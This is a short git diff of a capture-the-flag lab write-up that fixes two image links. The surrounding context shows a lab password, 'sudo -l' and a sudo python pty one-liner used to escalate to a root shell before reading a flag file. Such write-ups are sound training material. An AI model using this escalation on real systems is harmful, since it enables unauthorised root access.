@@ -152,7 +152,7 @@ $ mysql -u root -p
     - **Password:** `pink84`  
   - Escalating to root:  
     - **Command:** `sudo -l`  
-![Sudo Steven's Account]()  
+![Sudo Steven's Account](images/steven.png)  
     - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`  
 ```bash    
 $ sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
@@ -162,6 +162,6 @@ $ sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
     - **Command:** `ls`  
     - **Command:** `cat flag4.txt`
   - Screenshot of `Flag 4`:  
-![Flag 4]((images/flag4.png))
+![Flag 4](images/flag4.png)
 
 ### Submitted By - Aziz Somani
